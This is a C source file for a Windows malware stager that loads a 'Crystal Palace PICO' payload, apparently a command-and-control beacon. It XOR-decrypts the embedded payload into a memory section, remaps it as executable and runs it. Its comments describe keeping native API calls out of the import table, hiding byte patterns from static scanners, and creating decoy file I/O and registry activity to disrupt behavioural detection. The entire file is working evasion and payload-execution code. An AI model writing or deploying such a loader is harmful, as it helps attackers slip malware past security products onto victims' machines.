/*
 * stager.c — Crystal Palace PICO runner (RoguePlanet-inspired evasion)
 *
 * Techniques applied from RoguePlanet research:
 *
 *  1. NtCreateSection + NtMapViewOfSection (Poseidon memory model)
 *       - VirtualAlloc is NOT in the IAT — resolved dynamically or absent
 *       - NtCreate/MapViewOfSection resolved at runtime via GetProcAddress
 *         so ntdll Nt* calls are NOT in the IAT either
 *       - RW view written, then unmapped; RX view mapped separately
 *         → no single mapping is ever both writable and executable
 *
 *  2. XOR-decrypted PICO (build-time encryption via gen_payload.py)
 *       - Crystal Palace byte patterns are invisible to static scanners
 *       - Fresh random 256-byte key per build → unique .data each compile
 *
 *  3. BCryptGenRandom noise (Poseidon I/O)
 *       - Writes a page of random data to a temp file, then deletes it
 *       - Adds bcrypt.dll to IAT (normal apps use it for RNG/hashing)
 *       - Creates file I/O activity before payload execution (disrupts
 *         timing-based behavioural scanners)
 *
 *  4. Inherited from previous stager:
 *       - WinMain / GUI subsystem (no console)
 *       - advapi32 RegOpenKeyExW (widens import table)
 *       - Version info resource (resource.rc)
 *
 * IAT summary: kernel32, advapi32, bcrypt — nothing from ntdll.
 * VirtualAlloc, VirtualProtect, VirtualFree: absent.
 */

#include <windows.h>
#include <bcrypt.h>
#include "pico_payload.h"   /* pico_key[], pico_key_len, pico_payload[], pico_payload_len */

#ifndef SEC_COMMIT
#define SEC_COMMIT 0x8000000
#endif
#define MY_ViewUnmap 2  /* SECTION_INHERIT ViewUnmap */

/* ── Nt* typedefs — resolved at runtime, not in IAT ─────────────────────── */

typedef LONG NTSTATUS;

typedef NTSTATUS (WINAPI *pfnNtCreateSection)(
    PHANDLE            SectionHandle,
    ACCESS_MASK        DesiredAccess,
    PVOID              ObjectAttributes,
    PLARGE_INTEGER     MaximumSize,
    ULONG              SectionPageProtection,
    ULONG              AllocationAttributes,
    HANDLE             FileHandle);

typedef NTSTATUS (WINAPI *pfnNtMapViewOfSection)(
    HANDLE             SectionHandle,
    HANDLE             ProcessHandle,
    PVOID             *BaseAddress,
    ULONG_PTR          ZeroBits,
    SIZE_T             CommitSize,
    PLARGE_INTEGER     SectionOffset,
    PSIZE_T            ViewSize,
    DWORD              InheritDisposition,
    ULONG              AllocationType,
    ULONG              Win32Protect);

typedef NTSTATUS (WINAPI *pfnNtUnmapViewOfSection)(
    HANDLE             ProcessHandle,
    PVOID              BaseAddress);

typedef void (*pico_fn)(void *);

/* ── Poseidon I/O noise (from RoguePlanet) ───────────────────────────────── */

static void poseidon_noise(void)
{
    unsigned char buf[0x1000];
    BCryptGenRandom(NULL, buf, sizeof(buf), BCRYPT_USE_SYSTEM_PREFERRED_RNG);

    wchar_t tmpdir[MAX_PATH], tmpfile[MAX_PATH];
    if (GetTempPathW(MAX_PATH, tmpdir) &&
        GetTempFileNameW(tmpdir, L"upd", 0, tmpfile))
    {
        HANDLE h = CreateFileW(tmpfile, GENERIC_WRITE, 0, NULL,
                               OPEN_ALWAYS, FILE_FLAG_DELETE_ON_CLOSE, NULL);
        if (h && h != INVALID_HANDLE_VALUE) {
            DWORD written;
            WriteFile(h, buf, sizeof(buf), &written, NULL);
            CloseHandle(h);   /* FILE_FLAG_DELETE_ON_CLOSE removes it here */
        }
    }

    SecureZeroMemory(buf, sizeof(buf));
}

/* ── PICO execution thread ───────────────────────────────────────────────── */

static DWORD WINAPI run_pico(LPVOID param)
{
    (void)param;

    /* Resolve Nt* at runtime — keeps them out of the IAT */
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    pfnNtCreateSection      NtCreateSection      =
        (pfnNtCreateSection)     GetProcAddress(hNtdll, "NtCreateSection");
    pfnNtMapViewOfSection   NtMapViewOfSection   =
        (pfnNtMapViewOfSection)  GetProcAddress(hNtdll, "NtMapViewOfSection");
    pfnNtUnmapViewOfSection NtUnmapViewOfSection =
        (pfnNtUnmapViewOfSection)GetProcAddress(hNtdll, "NtUnmapViewOfSection");

    if (!NtCreateSection || !NtMapViewOfSection || !NtUnmapViewOfSection)
        return 1;

    /* Step 1: create anonymous RWX section (large enough for the PICO) */
    HANDLE hSec = NULL;
    LARGE_INTEGER secSz;
    secSz.QuadPart = (LONGLONG)pico_payload_len;
    if (NtCreateSection(&hSec, SECTION_ALL_ACCESS, NULL, &secSz,
                        PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL))
        return 1;

    /* Step 2: map RW view — write & XOR-decrypt here */
    void  *rw  = NULL;
    SIZE_T sz  = 0;
    if (NtMapViewOfSection(hSec, GetCurrentProcess(), &rw, 0, 0, NULL,
                            &sz, MY_ViewUnmap, 0, PAGE_READWRITE)) {
        CloseHandle(hSec);
        return 1;
    }

    unsigned char *dst = (unsigned char *)rw;
    for (DWORD i = 0; i < pico_payload_len; i++)
        dst[i] = pico_payload[i] ^ pico_key[i % pico_key_len];

    /* Step 3: drop write — unmap RW, remap RX */
    NtUnmapViewOfSection(GetCurrentProcess(), rw);

    void  *rx = NULL;
    SIZE_T rxsz = 0;
    if (NtMapViewOfSection(hSec, GetCurrentProcess(), &rx, 0, 0, NULL,
                            &rxsz, MY_ViewUnmap, 0, PAGE_EXECUTE_READ)) {
        CloseHandle(hSec);
        return 1;
    }
    CloseHandle(hSec);

    /* Step 4: execute Crystal Palace PICO
     * +gofirst guarantees go() is at offset 0; args baked in at link time. */
    ((pico_fn)rx)(NULL);
    return 0;
}

/* ── Entry point ─────────────────────────────────────────────────────────── */

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow)
{
    (void)hInst; (void)hPrev; (void)lpCmd; (void)nShow;

    /* Poseidon noise before anything else */
    poseidon_noise();

    /* Registry read: advapi32 import, looks like normal app init */
    HKEY hk = NULL;
    RegOpenKeyExW(HKEY_LOCAL_MACHINE,
                  L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion",
                  0, KEY_READ, &hk);
    if (hk) RegCloseKey(hk);

    /* Spin up the PICO loader thread */
    HANDLE h = CreateThread(NULL, 0, run_pico, NULL, 0, NULL);
    if (!h) return 1;

    /* Wait for Crystal Palace to return (StartW starts goroutine, returns) */
    WaitForSingleObject(h, INFINITE);
    CloseHandle(h);

    /* Beacon goroutine is alive in this process — keep process running */
    for (;;) SleepEx(30000, TRUE);
}
